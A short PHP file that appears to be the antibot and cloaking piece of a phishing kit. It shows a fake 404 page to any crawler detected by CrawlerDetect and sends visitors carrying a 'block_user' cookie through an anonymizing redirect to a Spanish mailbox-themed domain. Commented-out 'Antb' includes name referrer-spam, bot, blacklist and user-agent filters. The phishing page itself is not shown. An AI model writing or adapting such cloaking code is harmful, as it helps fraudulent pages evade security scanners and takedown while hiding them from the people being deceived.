<?php
	//error_reporting(0);
	
	require_once __DIR__ . '/vendor/autoload.php';
	use Jaybizzle\CrawlerDetect\CrawlerDetect;
	
	
		/*include 'Antb/refspam.php';
		include 'Antb/basicbot.php';
		include 'Antb/bl.php';
		include 'Antb/nd.php';
		include 'Antb/uacrawler.php';
*/

$crawlerDetect = new CrawlerDetect();

// Check if the current user agent is a crawler
if ($crawlerDetect->isCrawler()) {
    // Send 404 header
    header("HTTP/1.0 404 Not Found");

    // Display custom error message or include a 404 error page
    echo "<h1>404 Not Found</h1>";
    echo "<p>The page you requested could not be found.</p>";
    exit;
}

if($block_user_after_redirect){
	if (isset($_COOKIE["block_user"])) {
	    header("Location: https://href.li/?https://buzondecorreo.com");
	    exit(); // Stop further execution
	}
}
?>